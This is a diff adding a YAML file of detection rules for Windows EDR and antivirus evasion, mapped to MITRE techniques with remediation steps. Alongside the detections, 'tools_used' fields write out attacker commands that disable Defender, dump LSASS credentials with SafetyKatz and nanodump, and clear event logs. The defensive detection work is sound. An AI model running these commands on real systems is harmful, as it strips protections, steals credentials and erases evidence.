@@ -1,0 +1,318 @@
+title: AdStrike - EDR/AV Evasion Detection Rules
+id: sast-edr-001
+status: production
+description: |
+  SAST detection rules for EDR and AV evasion techniques including Windows
+  Defender disablement, SafetyKatz+Loader in-memory execution, AMSI bypass
+  variants, ETW patching, NTDLL unhooking (Hell's Gate), process hollowing,
+  BOF execution, nanodump/PPLdump stealthy LSASS dump, and event log clearing.
+author: AdStrike SAST Module
+date: 2026-04-24
+mitre_attack:
+  - T1562.001  # Disable or Modify Tools (AV/EDR)
+  - T1562.002  # Disable Windows Event Logging
+  - T1055      # Process Injection
+  - T1055.012  # Process Hollowing
+  - T1059.001  # PowerShell (AMSI Bypass)
+
+rules:
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: Windows Defender Disable  (T1562.001)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: edr-defender-disable-001
+    title: Windows Defender Disabled via Set-MpPreference
+    technique: T1562.001
+    severity: critical
+    description: >
+      Set-MpPreference used to disable Windows Defender real-time protection,
+      IOAV protection, behavior monitoring, and cloud protection. Standard
+      CRTP flow — first step before loading offensive tools.
+    event_sources:
+      - windows_defender_eventlog:
+          event_ids:
+            - 5001  # Real-time protection disabled
+            - 5004  # Real-time protection configuration changed
+            - 5007  # Configuration changed
+      - windows_security_eventlog:
+          event_ids: [4688]
+    detection:
+      sigma_condition: |
+        (EventID=5001) OR
+        (EventID=5004 AND NewValue="0") OR
+        (EventID=4688 AND NewProcessName ENDSWITH "\\powershell.exe" AND
+         CommandLine CONTAINS "Set-MpPreference" AND
+         CommandLine CONTAINS "-Disable" AND
+         CommandLine CONTAINS "$true")
+      powershell_pattern:
+        - "Set-MpPreference -DisableRealtimeMonitoring $true"
+        - "Set-MpPreference -DisableIOAVProtection $true"
+        - "Set-MpPreference -DisableBehaviorMonitoring $true"
+        - "Set-MpPreference -DisableBlockAtFirstSeen $true"
+    tools_used:
+      - "Set-MpPreference -DisableRealtimeMonitoring $true"
+      - "Set-MpPreference -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true"
+      - "Add-MpPreference -ExclusionPath {tools_path}"
+    remediation:
+      - Alert on Windows Defender Event 5001 (protection disabled) — critical
+      - Monitor Set-MpPreference executions via PowerShell logging
+      - Implement tamper protection (prevents modification via PS/API)
+      - Use Windows Security Center monitoring for protection status
+      - Deploy secondary AV/EDR that monitors Defender state
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: SafetyKatz + Loader.exe In-Memory  (T1003.001)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: edr-safetykatz-001
+    title: SafetyKatz via Loader.exe — In-Memory Credential Dump (No Disk Write)
+    technique: T1003.001
+    severity: critical
+    description: >
+      SafetyKatz is modified Mimikatz that bypasses AV signatures. Loader.exe
+      fetches it from HTTP (127.0.0.1:8080 via port forwarding) and loads
+      directly into memory. No file written to disk — bypasses file-based AV.
+    process_indicators:
+      - process_name: "Loader.exe"
+        command_contains: ["-path", "http://", "SafetyKatz"]
+    detection:
+      sigma_condition: |
+        EventID=4688 AND
+        (NewProcessName ENDSWITH "\\Loader.exe" OR
+         CommandLine CONTAINS "SafetyKatz") AND
+        (CommandLine CONTAINS "sekurlsa::logonpasswords" OR
+         CommandLine CONTAINS "sekurlsa::ekeys" OR
+         CommandLine CONTAINS "lsadump::")
+      network_indicators:
+        - HTTP GET to 127.0.0.1:8080 for *.exe download  # Port forwarded
+        - Process download + execute from localhost (in-memory)
+    tools_used:
+      - "C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe \"sekurlsa::logonpasswords\" \"exit\""
+      - "C:\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe \"sekurlsa::ekeys\" \"exit\""
+    remediation:
+      - Monitor Loader.exe execution and HTTP connections from process
+      - Alert on .exe downloads from localhost (127.0.0.1) — unusual pattern
+      - Deploy behavioral EDR that detects in-memory .NET assembly loading
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: AMSI Bypass  (T1059.001)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: edr-amsi-bypass-001
+    title: AMSI Bypass — AmsiScanBuffer Patch in PowerShell Session
+    technique: T1059.001
+    severity: high
+    description: >
+      AMSI (Antimalware Scan Interface) bypass patches AmsiScanBuffer function
+      in amsi.dll to return AMSI_RESULT_CLEAN for all scans. Multiple variants:
+      reflection, direct patching, COM object manipulation.
+    event_sources:
+      - powershell_eventlog:
+          event_ids: [4104]
+    detection:
+      sigma_condition: |
+        EventID=4104 AND ScriptBlockText CONTAINS ANY [
+          "AmsiScanBuffer",
+          "amsi.dll",
+          "[Runtime.InteropServices.Marshal]::Copy",
+          "0xB8, 0x57, 0x00, 0x07, 0x80",  # Common patch bytes
+          "Reflection.Assembly]::LoadWithPartialName",
+          "AMSI",
+          "AmsiUtils"
+        ]
+      known_bypass_patterns:
+        - "sET-ItEM ( 'V'+'aR' + ..."  # String obfuscation
+        - "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
+        - "amsiContext"
+        - "patchbytes"
+    remediation:
+      - Enable AMSI for all PowerShell versions (v5+)
+      - Deploy EDR with AMSI integration
+      - Enable Script Block Logging to detect AMSI bypass attempts
+      - Monitor amsi.dll memory modifications
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: ETW Patching — Blind EDR Telemetry  (T1562.006)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: edr-etw-patch-001
+    title: ETW Patching — Event Tracing for Windows Telemetry Disabled
+    technique: T1562.006
+    severity: high
+    description: >
+      ETW (Event Tracing for Windows) patching blinds EDR products that rely
+      on ETW for telemetry. Patches EtwEventWrite in ntdll.dll to return
+      immediately without writing events. Effective against CrowdStrike, Defender.
+    detection:
+      sigma_condition: |
+        EventID=4104 AND ScriptBlockText CONTAINS ANY [
+          "EtwEventWrite",
+          "ntdll",
+          "patch",
+          "0x00C3",  # RET instruction byte
+          "SetProcessMitigationPolicy"
+        ]
+      memory_indicators:
+        - ntdll.dll EtwEventWrite function starts with RET opcode (0xC3)
+        - ntdll.dll modified in process memory
+    tools_used:
+      - "# ETW patch via PowerShell"
+      - "[Reflection.Assembly]::LoadFile('C:\\Windows\\System32\\ntdll.dll')"
+    remediation:
+      - Deploy EDR with kernel-mode telemetry (not reliant on ETW)
+      - Monitor ntdll.dll in-process modifications
+      - Use Kernel Patch Protection (KPP / PatchGuard) on DCs
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: NTDLL Unhooking — Hell's Gate / Freshcopy  (T1055)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: edr-ntdll-unhook-001
+    title: NTDLL Unhooking — Bypass EDR Userland Hooks
+    technique: T1055
+    severity: high
+    description: >
+      EDR products hook ntdll.dll syscall stubs to inspect API calls. NTDLL
+      unhooking loads clean copy from disk and replaces hooked section.
+      Hell's Gate uses direct syscalls to bypass hooks entirely.
+    detection:
+      sigma_condition: |
+        (EventID=4104 AND ScriptBlockText CONTAINS ANY ["ntdll","unhook","Hell's Gate","direct syscall"]) OR
+        (Memory: ntdll.dll loaded twice in same process) OR
+        (Sysmon Event 7: ntdll.dll loaded from unusual path)
+      sysmon_detection:
+        - event_id: 7  # Image loaded
+          ImageLoaded: "ntdll.dll"
+          ImagePath: NOT "C:\\Windows\\System32\\ntdll.dll"  # Loaded from copy
+    tools_used:
+      - "HellsGate.exe / SysWhispers / Freshcopy technique"
+    remediation:
+      - Deploy kernel-mode EDR (EarlyBird injection detection)
+      - Use ETW-based telemetry (harder to bypass than userland hooks)
+      - Monitor for ntdll.dll loaded from non-standard paths
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: nanodump — Stealthy LSASS Dump  (T1003.001)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: edr-nanodump-001
+    title: nanodump — Stealth LSASS Dump Bypassing Defender/CrowdStrike
+    technique: T1003.001
+    severity: critical
+    description: >
+      nanodump uses invalid file signatures and process ID spoofing to dump
+      LSASS while bypassing EDR. Creates a minidump without the MDMP signature
+      that can be post-processed offline.
+    process_indicators:
+      - process_name: "nanodump.exe"
+        or_similar: ["nanodump.x64.exe"]
+    detection:
+      sigma_condition: |
+        (EventID=10 AND TargetImage ENDSWITH "\\lsass.exe" AND
+         GrantedAccess IN ["0x1410","0x1fffff"]) OR
+        (EventID=4688 AND NewProcessName CONTAINS "nanodump")
+      file_indicators:
+        - A file created that is an LSASS minidump without standard MDMP header
+        - Unusually small dump file (nanodump writes minimal dump)
+    tools_used:
+      - "nanodump.exe --pid {lsass_pid} --write C:\\lsass.dmp"
+      - "nanodump.exe --valid"  # Valid minidump with fake signature
+    remediation:
+      - Enable RunAsPPL for LSASS
+      - Deploy Credential Guard
+      - Monitor LSASS access with non-standard GrantedAccess masks
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: Clear Windows Event Logs  (T1562.002)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: edr-clear-logs-001
+    title: Windows Event Log Clearing — Anti-Forensics
+    technique: T1562.002
+    severity: critical
+    description: >
+      Clearing Windows event logs removes evidence of attacker activity.
+      wevtutil.exe cl is the most common method. System event 1102 generated
+      upon Security log clearing (requires auditing enabled).
+    event_sources:
+      - windows_security_eventlog:
+          event_ids: [1102]  # Security audit log cleared
+      - system_eventlog:
+          event_ids: [104]   # System log cleared
+    detection:
+      sigma_condition: |
+        EventID=1102 OR EventID=104 OR
+        (EventID=4688 AND NewProcessName ENDSWITH "\\wevtutil.exe" AND
+         CommandLine CONTAINS ANY ["cl ", "clear-log"])
+    tools_used:
+      - "wevtutil.exe cl Security"
+      - "wevtutil.exe cl System"
+      - "Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }"
+      - "Clear-WinEvent -LogName Security"
+    remediation:
+      - Forward event logs to central SIEM immediately (before clearing)
+      - Enable Event Log forwarding (WEF - Windows Event Forwarding)
+      - Alert on Event 1102 immediately — critical indicator
+      - Restrict wevtutil.exe access via AppLocker/WDAC
+      - Implement immutable log storage
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE: RunAsPPL Disable  (T1562.001)
+# ─────────────────────────────────────────────────────────────────────────────
+  - id: edr-runasppl-disable-001
+    title: RunAsPPL Disabled — LSASS PPL Protection Removed
+    technique: T1562.001
+    severity: critical
+    description: >
+      RunAsPPL (Protected Process Light) prevents LSASS memory access.
+      PPLKiller or registry modification disables this protection.
+      After disable, full LSASS dump is possible.
+    registry_indicators:
+      - key: "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"
+        value: "RunAsPPL"
+        suspicious_value: "0"  # Disabled (1 = enabled)
+    event_sources:
+      - windows_security_eventlog:
+          event_ids: [4657]
+          conditions:
+            - field: ObjectName
+              contains: "RunAsPPL"
+    detection:
+      sigma_condition: |
+        EventID=4657 AND
+        ObjectName CONTAINS "\\Control\\Lsa\\RunAsPPL" AND
+        NewValue="0"
+    remediation:
+      - Enable PPL Tamper Protection (requires Secure Boot)
+      - Monitor RunAsPPL registry value (Event 4657)
+      - Alert on PPLKiller.exe execution
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SAST CODE ANALYSIS
+# ─────────────────────────────────────────────────────────────────────────────
+sast_code_analysis:
+  file: modules/edr_evasion.py
+  rules:
+    - id: sast-code-edr-001
+      title: Defender Disable Commands Displayed Without Scope Warning
+      severity: medium
+      pattern: |
+        Set-MpPreference -DisableRealtimeMonitoring \$true
+      description: >
+        Disabling Defender real-time protection affects entire system security.
+        Module should display clear warning that this affects the target system's
+        defense posture and may be detected by central monitoring.
+
+    - id: sast-code-edr-002
+      title: Event Log Clear Commands Present — Destructive Operation
+      severity: high
+      pattern: |
+        wevtutil.*cl|Clear-WinEvent|Clear-EventLog
+      description: >
+        Event log clearing is an irreversible destructive operation that destroys
+        forensic evidence. Module must require explicit operator confirmation
+        before displaying or executing log clearing commands.
+      recommendation: "Add confirmation prompt: 'WARNING: Clearing logs is destructive and obvious. Confirm? (yes/no)'"
+
+    - id: sast-code-edr-003
+      title: In-Memory Execution URL Points to Localhost — Port Forwarding Assumed
+      severity: info
+      pattern: |
+        http://127\.0\.0\.1:8080/
+      description: >
+        Commands reference localhost:8080 (assumes port forwarding is active).
+        Operator must establish port forward before these commands work.
+        Consider adding verification step or reminder.
